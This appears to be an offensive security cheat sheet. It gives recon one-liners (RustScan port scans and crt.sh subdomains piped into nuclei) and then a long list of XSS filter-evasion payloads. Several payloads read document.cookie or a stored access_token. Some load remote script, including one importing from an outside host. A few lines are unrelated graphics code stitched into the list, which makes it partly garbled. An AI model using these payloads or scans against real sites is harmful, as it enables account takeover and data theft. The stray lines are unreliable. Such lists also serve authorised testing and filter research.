## Scan Open Port with RUSTSCAN

```
cat list.txt | while IFS= read -r ip; do rustscan -a "$ip" --ulimit 65530 --accessible -g | grep -oP "\d+" | sort -urn | xargs -I {} echo "$ip:{}"; done
```
## Scan Subdomain & DNS
  - Anew: https://github.com/tomnomnom/anew
  - RustScan: https://github.com/RustScan/RustScan
  - Subdomain C99: https://api.c99.nl 
  - Censys: https://search.censys.io
  - AMASS: https://github.com/owasp-amass/amass
  - Subfinder: https://github.com/projectdiscovery/subfinder
  - Yusub: https://github.com/justakazh/yusub
  - CRT.sh: https://crt.sh
  - DNSX: https://github.com/projectdiscovery/dnsx

## Crt + Rustscan + Nuclei
```
DOMAIN="<site>"; curl -sk "https://crt.sh/json?q=$DOMAIN" | jq -r ".[].name_value" | sort -u | while IFS= read -r ip; do rustscan -a "$ip" --ulimit 65530 --ports 80,443,8080,8443 --accessible -g | grep -oP "\d+" | sort -urn | xargs -I {} echo "$ip:{}"; done | httprobe | nuclei -nh -as -itags js,seclist,passive,network,file,fuzz,headless,extractor,tech,dns,code,linux,privesc,cloud,devops,osint,tcp,kev,exposure,backdoor,honeypot
```
## XSS Payload
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
{{‘a’.constructor.prototype.charAt=[].join;$eval(‘x=1} } };alert(document.domain)//’);}} )
{{constructor.constructor('alert(1)')()}}                          
{{this.construct.construct('alert("foo")')()}}
alert(localStorage.getItem('access_token'))   
asdf%22%20\onmouseover=alert`1`;%             
asdf%22;alert`1`;//                           
<img src=x>’”${7*7}                           
<svg%0Aonauxclick=0;[1].some(confirm)//        
[img]http://server/x.jpg"OnMoUsEoVeR=window.location="//google.com[/img]         
Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();                                  
//%250athrow%20on{err}o}r=a{ler}t,1337                   
<body/onload=foo=[123,666,999]>               
"/onClick=(alert)(1)//                        
<object/data="javascript&colon;alert/**/(document.domain)">//                     
'\141\154\145\162\164\50\61\51'instanceof{[Symbol.hasInstance]:eval}             
<style>@im\\port'\\ja\\vasc\\ript:alert(\\\"XSS"\\\")';</style>                  
%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx                                  
<svg id=alert(1337) onload=eval(id)>                                             
<svg id=javascript:alert(1337) onload=location=id>                               
[]?.findIndex?.(dump)+('<input onfocus=alert(1) autofocus>');                    
x=this?.[[]?.x??/a/.source+'\x6c'+13439..toString?.(30)],[1]?.findIndex?.(x);     
([]?.x??alert)(1);                                                    
Window.dump(alert(1))                         
<svg><x><script>alert&#40;7&#41</x>           
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JIYXRIRWxlbWVudCgic2NyaXB0lik7YS5zcmM9Lmh0dHBzOi8vYXLkaW5ueXVudXMueHNzL>
1&quot;Style=&quot;position:fixed;top:0;left:0;font-size:999px;&quot;OnPointerEnter=&quot;(confirm)(1)&quot;                 
<Svg%K9OnLoad=%7Krompt%6K1%6K> 
-self[Object.keys(self)[6]] (document.d\u006Fmain)-
<svg onload="alert%26%2300000000000040;1%26%2300000000000041;">
</title><!--><svg onload%3Dlocation=loc%26%2397;tion.h%26%2397;sh.subst%26%23114;%26lpar;1>#javascript:alert(document.domain)
%252522-alert%252528document.cookie%252529-%252522
<form action="javascript%26%2358;alert%26%2340;document.domain%26%2341;"><input type=submit>
%26apos;,alert%26lpar;1%26rpar;//
'-alert(1)'
"-alert(1)-"
<svg/onload=alert(1)//
<sVg/OnLoAd=AlErT(1)//
*/alert(1)</script><script>/*
%253cscript%253ealert%25281%2529%253c%252fscript%253e
%25253cscript%25253ealert%2525281%252529%25253c%25252fscript%25253e
" onclick="alert(1)" accesskey="x
<scr<script>ipt>alert(1)</script>
" onx=[] onmouseover=prompt(2)>
" onx={} onmouseover=prompt(2)>
" onx=() onmouseover=prompt(2)>
asdf‘-Function`self[‘a’\x2b’l’\x2b’e’\x2b’r’\x2b’t’]\x281\x29```-’ asdf `-
Function`self[‘a’+’l’+’e’+’r’+’t’](1)```-’
“}<%00svg&#x09;x/%00onload=&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000100&#0000111&#0000099&#0000117&#0000109&#0000101&#0000110&#0000116&#0000046&#0000100&#0000111&#0000109&#0000097&#0000105&#0000110&#0000041>
“}%3c%25%30%30%73%76%67%26%23%78%30%39%3b%78%2f%25%30%30%6f%6e%6c%6f%61%64%3d%26%23%30%30%30%30%30%39%37%26%23%30%30%30%30%31%30%38%26%23%30%30%30%30%31%30%31%26%23%30%30%30%30%31%31%34%26%23%30%30%30%30%31%31%36%26%23%30%30%30%30%30%34%30%26%23%30%30%30%30%31%30%30%26%23%30%30%30%30%31%31%31%26%23%30%30%30%30%30%39%39%26%23%30%30%30%30%31%31%37%26%23%30%30%30%30%31%30%39%26%23%30%30%30%30%31%30%31%26%23%30%30%30%30%31%31%30%26%23%30%30%30%30%31%31%36%26%23%30%30%30%30%30%34%36%26%23%30%30%30%30%31%30%30%26%23%30%30%30%30%31%31%31%26%23%30%30%30%30%31%30%39%26%23%30%30%30%30%30%39%37%26%23%30%30%30%30%31%30%35%26%23%30%30%30%30%31%31%30%26%23%30%30%30%30%30%34%31%3e
”><iframe/src=javascript&colon;[document&period;domain].find(alert)>
"><a href=”javascript&colon;alert&lpar;document&period;domain&rpar;”>Click Here</a>
123%3Ca+href%3Djav%26%23x09%3Bascript%3Aprom%26%23x09%3Bpt%28doc%26%23x09%3Bument.coo%26%23x09%3Bkie%29%3B%3Easdasdas%3C%2Fa%3E
eyJuYW1lIjogIlRlc3QgSGFja2VyT25lIiwgInN0YXJ0X2RhdGUiOiAiMDEuMDEuMjAxOCIsICJsZWFucGx1bV9pZCI6ICJ0ZXN0IiwgInJpZGVzIjogIjIwMCIsICJwbGFjZXMiOiAiMjAiLCAiZGlzdGFuY2UiOiA1MDAsICJjYW5jZWxfdGltZXMiOiAiMCIsICJkYXlzIjogIjEwMCIsICJwcm9tb19jb2RlIjogImphdmFzY3JpcHQ6Ly9yLmdyYWIuY29tL3Rlc3QlMGFhbGVydChkb2N1bWVudC5kb21haW4pIiwgInByZl9yZXdhcmQiOiAiMTAifQ==
document.write(atob(`PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`));
javascript:document.onload%20=%20prompt(document.cookie);
<div style="width:1000px;height:1000px" onmouseover=alert()></div>
<marquee width=10 loop=2 behavior="alternate" onbounce=alert()>
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<input autofocus="" onfocus=alert(1)></input>
<details open ontoggle="alert()">
<video autoplay onloadstart="alert()" src=x></video>
<video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadeddata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadedmetadata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadstart="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<video controls onloadstart="alert()"><source src=x></video>
<video controls oncanplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
<audio autoplay controls onplaying="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
<style>@keyframes x {}</style><p style="animation: x;" onanimationstart="alert()">XSS</p><p style="animation: x;" onanimationend="alert()">XSS</p>
<svg><animate onbegin=alert() attributeName=x></svg>
<object data="data:text/html,<script>alert(5)</script>">
<iframe srcdoc="<svg onload=alert(4);>">
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
</script><svg><script>alert(1)-%26apos%3B
anythinglr00</script><script>alert(document.domain)</script>uxldzanythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<a href=javas&#99;ript:alert(1)>
%2sscript%2ualert()%2s/script%2u
<style>@KeyframeS x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
{{[''.constructor.prototype.charAt=[].join]|orderBy:'x=1} } };alert(1)//'}}
{{[''.constructor.prototype.charAt=[].join]|orderBy:'x=1} } };alert(1)//'}}
{{[]."-alert`1`-"}}
{{$on.constructor{'&bsol;&bsol;u&bsol;u007b61}lert`1`')()}}
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
X(S,D)I=ivec3(S);D=fract(float(I.x^I.y^I.z)*PI vec3 p;float d=1.,h,H;ivec3 I;for(;h<9.&&d>.9;){p=vec3((FC.xy-r)/r.y,1)*h+vec3(0,2,t);X(p*4.,H)*.9);d=p.y-pow(H,20.);h+=.01;}X(p*1e2,d)+t*.1);http://o.xyz=p*pow(d,1e2)+h/18.;
'alert(1)'.match({__proto__:RegExp.prototype,global:1,unicode:1,exec:eval})
<svg onload=alert%26%230000000040"1")>
w=t=640,draw=_=>{createCanvas(w,w);loadPixels() for(t++,q=y=w/4;y--;)for(x=q;x--;)(t-y-x^t-y+x)**sqrt(2)%33<(x+y)/19&&set(x,y,0) updatePixels();clear(g=get(0,0,q,q));image(g,0,0,w,w)}
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++], 𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror='alert(1)'>"></style></h1>
-->#"javascript:alert(1)
-->#"javascript:prompt(1)
-->#"javascript:confirm(1)
"><body/onload=prompt(1)>
"><a href="javasciript:throw 1337">
<\ "\/*'\/*></Title\/<\/Script\/--><svg\/**\/%3B OnlOad=(alert)(1)\/\/>#asdf"}
"><Svg/Onload=top?.[/ale/?.source+/rt/?.source]?.(document?.[/dom/?.source+/ain/?.source])>
"><Svg+Onx=()+OnLoad=alert?.(domain)>
1\47\42\55\55\41\76\74Img\40Src\40OnError\75confirm\140\113\140\76
1\'/[location=`Javas\x63ript:\x63onfirm\x60K\x60`]//
JavaScript://%250Dtop.confirm(1)//?1
<Img Src=//X55.is OnLoad=import(src)>
alert?.(document?.domain)[document?.domain]?.map?.(alert)
top?.[/ale/?.source+/rt/?.source]?.(document?.[/dom/?.source+/ain/?.source])
%EF%BC%9C/script%ef%bc%9e%EF%BC%9Cscript%ef%bc%9econfirm%601%60%EF%BC%9C/script%ef%bc%9e
"><On%00click=prompt(document.cookie)>
"><img sr%00c=x o%00nerror=prompt(document.cookie)>
"><On%00mouseover=prompt(document.cookie)>
<!<script>confirm(1)</script>
<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>
<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
<svg onload\r\n=$.globalEval("al"+"ert()");>
<a href=&#01javascript:alert(1)>
<a href=javascript&colon;confirm(1)>
<a href="jav%0Dascript&colon;alert(1)">
```

## DoH
```
https://dns.google/resolve?name=
```
